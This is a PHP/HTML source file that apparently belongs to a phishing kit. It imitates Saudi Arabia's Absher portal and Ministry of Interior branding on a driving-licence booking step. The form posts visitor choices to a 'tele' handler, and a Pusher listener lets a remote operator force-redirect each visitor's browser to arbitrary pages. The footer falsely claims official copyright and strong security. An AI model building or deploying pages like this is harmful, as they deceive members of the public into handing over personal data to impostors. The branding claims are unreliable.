<?php

session_start();
require_once '../includes/lang.php';
set_site_lang('en');


// 🔹 تجهيز النظام
require_once '../dashboard/init.php';
require_once '../includes/redirect.php';

// 🔹 الVerify من وجود user_id
$userId = $_SESSION['current_user_id'] ?? null;

if (!$userId) {
    header('Location: register.php');
    exit;
}

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Absher - استكمال طلب Driving License</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    
    <link rel="stylesheet" href="../includes/lang-toggle.css">
    <script src="../includes/lang-redirect.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", sans-serif;
            direction: ltr;
        }

        body {
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ============================================
           شريط Absher الأخضر العلوي
        ============================================ */
        .absher-header {
            background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
            padding: 15px 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
        }

        .absher-header .container {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .absher-logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .absher-logo h1 {
            color: white;
            font-size: 1.5rem;
            font-weight: 700;
            margin: 0;
        }

        .gov-badge {
            background: rgba(255,255,255,0.2);
            padding: 8px 20px;
            border-radius: 25px;
            color: white;
            font-weight: 600;
            font-size: 0.9rem;
        }

        /* ============================================
           Progress Bar
        ============================================ */
        .progress-container {
            background: white;
            padding: 25px;
            margin: 20px auto;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 700px;
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            margin-bottom: 15px;
        }

        .progress-steps::before {
            content: '';
            position: absolute;
            top: 20px;
            right: 0;
            width: 100%;
            height: 3px;
            background: #e0e0e0;
            z-index: 0;
        }

        .progress-step {
            position: relative;
            z-index: 1;
            text-align: center;
            flex: 1;
        }

        .step-circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #e0e0e0;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: 700;
            transition: all 0.3s;
        }

        .step-circle.completed {
            background: #2d7a3e;
            color: white;
        }

        .step-circle.active {
            background: #2d7a3e;
            color: white;
            box-shadow: 0 0 0 5px rgba(45, 122, 62, 0.2);
        }

        .step-label {
            font-size: 0.85rem;
            color: #666;
            font-weight: 600;
        }

        .step-label.active {
            color: #2d7a3e;
            font-weight: 700;
        }

        /* ============================================
           منطقة المحتوى
        ============================================ */
        .main-content {
            flex: 1;
            padding: 20px 0 40px;
        }

        .form-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 700px;
            margin: 0 auto;
        }

        .page-title {
            text-align: center;
            color: #2d7a3e;
            font-weight: 700;
            font-size: 1.8rem;
            margin-bottom: 10px;
        }

        .page-subtitle {
            text-align: center;
            color: #666;
            font-size: 1rem;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
        }

        /* ============================================
           حقول النموذج
        ============================================ */
        .form-label {
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            font-size: 0.95rem;
        }

        .required-star {
            color: #d32f2f;
            font-weight: bold;
            margin-right: 3px;
        }

        .form-control,
        .form-select {
            height: 50px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            padding: 0 15px;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .form-control:focus,
        .form-select:focus {
            border-color: #2d7a3e;
            box-shadow: 0 0 0 3px rgba(45, 122, 62, 0.1);
            outline: none;
        }

        /* ============================================
           زر الContinue
        ============================================ */
        .btn-submit {
            background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
            border: none;
            color: white;
            height: 55px;
            font-size: 1.1rem;
            font-weight: 700;
            border-radius: 10px;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(45, 122, 62, 0.3);
        }

        .btn-submit:hover:not(:disabled) {
            background: linear-gradient(135deg, #1e5a2d 0%, #2d7a3e 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(45, 122, 62, 0.4);
        }

        .btn-submit:disabled {
            background: #cccccc;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* ============================================
           التذييل الحكومي
        ============================================ */
        .gov-footer {
            background: #1a1a1a;
            color: white;
            padding: 40px 0 20px;
            margin-top: auto;
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin-bottom: 30px;
        }

        .footer-section h5 {
            color: #2d7a3e;
            font-weight: 700;
            margin-bottom: 15px;
            font-size: 1.1rem;
        }

        .footer-section ul {
            list-style: none;
            padding: 0;
        }

        .footer-section ul li {
            margin-bottom: 10px;
        }

        .footer-section ul li a {
            color: #ccc;
            text-decoration: none;
            transition: color 0.3s;
            font-size: 0.9rem;
        }

        .footer-section ul li a:hover {
            color: #2d7a3e;
        }

        .footer-bottom {
            border-top: 1px solid #333;
            padding-top: 20px;
            text-align: center;
        }

        .footer-bottom p {
            color: #999;
            margin: 5px 0;
            font-size: 0.85rem;
        }

        .footer-logos {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 30px;
            margin-top: 20px;
            flex-wrap: wrap;
        }

        .footer-logos img {
            height: 50px;
            filter: brightness(0) invert(1);
            opacity: 0.6;
            transition: opacity 0.3s;
        }

        .footer-logos img:hover {
            opacity: 1;
        }

        /* ============================================
           Responsive
        ============================================ */
        @media (max-width: 768px) {
            .form-container {
                padding: 25px;
                margin: 0 15px;
            }

            .progress-container {
                margin: 15px;
                padding: 20px 15px;
            }

            .page-title {
                font-size: 1.4rem;
            }

            .absher-logo h1 {
                font-size: 1.2rem;
            }

            .gov-badge {
                font-size: 0.8rem;
                padding: 6px 15px;
            }

            .footer-content {
                grid-template-columns: 1fr;
            }

            .step-label {
                font-size: 0.75rem;
            }

            .step-circle {
                width: 35px;
                height: 35px;
                font-size: 0.9rem;
            }
        }
    </style>
</head>

<body>

    <!-- ============================================
         شريط Absher الأخضر
    ============================================ -->
    <header class="absher-header">
        <div class="container">
            <div class="absher-logo">
                <i class="fas fa-shield-alt" style="color: white; font-size: 2.5rem;"></i>
                <h1>Absher</h1>
            </div>
                        <div class="header-actions">
                <div class="gov-badge">
                    <i class="fas fa-landmark"></i>
                    Ministry of Interior
                </div>
                <?php echo render_lang_toggle(); ?>
            </div>
        </div>
    </header>

    <!-- ============================================
         Progress Bar
    ============================================ -->
    <div class="progress-container container">
        <div class="progress-steps">
            <div class="progress-step">
                <div class="step-circle completed">
                    <i class="fas fa-check"></i>
                </div>
                <div class="step-label">Basic Information</div>
            </div>
            <div class="progress-step">
                <div class="step-circle active">2</div>
                <div class="step-label active">Training Details</div>
            </div>
            <div class="progress-step">
                <div class="step-circle">3</div>
                <div class="step-label">Review & Confirm</div>
            </div>
        </div>
    </div>

    <!-- ============================================
         منطقة المحتوى الرئيسية
    ============================================ -->
    <main class="main-content">
        <div class="container">
            <div class="form-container">
                <h2 class="page-title">
                    <i class="fas fa-car"></i>
                    Training Details
                </h2>
                <p class="page-subtitle">
                    Please select the required training details
                </p>

                <form action="../tele/register-second.php" method="POST">
                    <!-- Select Region -->
                    <div class="mb-4">
                        <label for="region" class="form-label">
                            <i class="fas fa-map-marker-alt"></i>
                            Select Region
                            <span class="required-star">*</span>
                        </label>
                        <select name="region" id="region" required class="form-select">
                            <option value="">Select region</option>
                            <option value="Jeddah">Jeddah</option>
                            <option value="Riyadh">Riyadh</option>
                            <option value="Tabuk">Tabuk</option>
                            <option value="Qassim">Qassim</option>
                            <option value="Taif">Taif</option>
                            <option value="Jazan">Jazan</option>
                            <option value="Khobar">Khobar</option>
                            <option value="Dammam">Dammam</option>
                            <option value="Makkah">Makkah</option>
                            <option value="Hafr Al Batin">Hafr Al Batin</option>
                            <option value="Arar">Arar</option>
                            <option value="Other">Other</option>
                        </select>
                    </div>

                    <!-- Select Level -->
                    <div class="mb-4">
                        <label for="level" class="form-label">
                            <i class="fas fa-layer-group"></i>
                            Select Level
                            <span class="required-star">*</span>
                        </label>
                        <select name="level" id="level" required class="form-select">
                            <option value="">Select level</option>
                                                        <option value="Level assessment">Level assessment</option>
                            <option value="30-hour program">30-hour program</option>
                            <option value="12-hour program">12-hour program</option>
                            <option value="6-hour program">6-hour program</option>
                                                        <option value="Final test appointment (foreign license replacement)">Final test appointment (foreign license replacement)</option>
                          
                        </select>
                    </div>

                    <!-- Transmission Type -->
                    <div class="mb-4">
                        <label for="gear_type" class="form-label">
                            <i class="fas fa-cog"></i>
                            Transmission Type
                            <span class="required-star">*</span>
                        </label>
                        <select name="gear_type" id="gear_type" required class="form-select">
                            <option value="">Select Transmission Type</option>
                            <option value="Manual">Manual</option>
                            <option value="Automatic">Automatic</option>
                        </select>
                    </div>

                    <!-- Time Period -->
                    <div class="mb-4">
                        <label for="time_period" class="form-label">
                            <i class="fas fa-clock"></i>
                            Time Period
                            <span class="required-star">*</span>
                        </label>
                        <select name="time_period" id="time_period" required class="form-select">
                            <option value="">Select Time Period</option>
                            <option value="Morning period (9 AM - 2 PM)">Morning (9 AM - 2 PM)</option>
                            <option value="Evening period (2 PM - 8 PM)">Evening (2 PM - 8 PM)</option>
                        </select>
                    </div>

                    <!-- Preferred Appointment Date -->
                    <div class="mb-4">
                        <label for="appointment_date" class="form-label">
                            <i class="fas fa-calendar-alt"></i>
                            Preferred Appointment Date
                            <span class="required-star">*</span>
                        </label>
                        <input type="date" name="appointment_date" id="appointment_date" required class="form-control">
                    </div>

                    <!-- زر الContinue -->
                    <div class="text-center mt-5">
                        <button type="submit" name="submit" id="butSubm" class="btn-submit" disabled>
                            <i class="fas fa-arrow-right"></i>
                            Continue
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <!-- ============================================
         التذييل الحكومي
    ============================================ -->
    <footer class="gov-footer">
        <div class="container">
            <div class="footer-content">
                <!-- Absher Services -->
                <div class="footer-section">
                    <h5><i class="fas fa-globe"></i> Absher Services</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Driving License</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Traffic Violations</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Iqama Renewal</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Visa Inquiry</a></li>
                    </ul>
                </div>

                <!-- Contact Us -->
                <div class="footer-section">
                    <h5><i class="fas fa-phone-alt"></i> Contact Us</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-headset"></i> Call Center: 920020405</a></li>
                        <li><a href="#"><i class="fas fa-envelope"></i> Email</a></li>
                        <li><a href="#"><i class="fab fa-twitter"></i> Twitter</a></li>
                        <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
                    </ul>
                </div>

                <!-- Important Links -->
                <div class="footer-section">
                    <h5><i class="fas fa-link"></i> Important Links</h5>
                    <ul>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Terms & Conditions</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Privacy Policy</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> FAQ</a></li>
                        <li><a href="#"><i class="fas fa-chevron-right"></i> Site Map</a></li>
                    </ul>
                </div>
            </div>

            <!-- أسفل التذييل -->
            <div class="footer-bottom">
                <div class="footer-logos">
                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='50' font-size='40' fill='white'%3E🇸🇦%3C/text%3E%3C/svg%3E" alt="Kingdom of Saudi Arabia">
                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 100'%3E%3Ctext y='60' font-size='35' fill='white'%3E⚔️%3C/text%3E%3C/svg%3E" alt="Ministry of Interior">
                </div>
                <p class="mt-3">
                    <i class="fas fa-copyright"></i>
                    2025 All rights reserved - Absher Platform - Ministry of Interior - Kingdom of Saudi Arabia
                </p>
                <p>
                    <i class="fas fa-shield-alt"></i>
                    A secure system protected by the highest cybersecurity standards
                </p>
            </div>
        </div>
    </footer>

    <!-- ============================================
         JavaScript
    ============================================ -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    
    <script>
        // Pusher Configuration
        const pusher = new Pusher('a56388ee6222f6c5fb86', {
            cluster: 'ap2',
            encrypted: true
        });

        const channel = pusher.subscribe('my-channel');

        channel.bind('force-redirect-user', function(data) {
            const myId = localStorage.getItem('current_user_id');

            if (myId && data.userId == myId) {
                window.location.href = applySiteLangRedirect(data.url);
            }
        });

        // 🔹 تحديد الحد الأدنى للتاريخ (من بعد يوم واحد - غداً)
        const appointmentDateInput = document.getElementById('appointment_date');
        const today = new Date();
        const tomorrow = new Date(today);
        tomorrow.setDate(tomorrow.getDate() + 1);
        
        // تنسيق التاريخ إلى YYYY-MM-DD
        const minDate = tomorrow.toISOString().split('T')[0];
        appointmentDateInput.min = minDate;

        // Form Validation
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');

            // Listen to input events on all form fields
            form.addEventListener('input', function() {
                if (form.checkValidity()) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // Also check on page load in case browser autofills
            if (form.checkValidity()) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        });
    </script>

</body>

</html>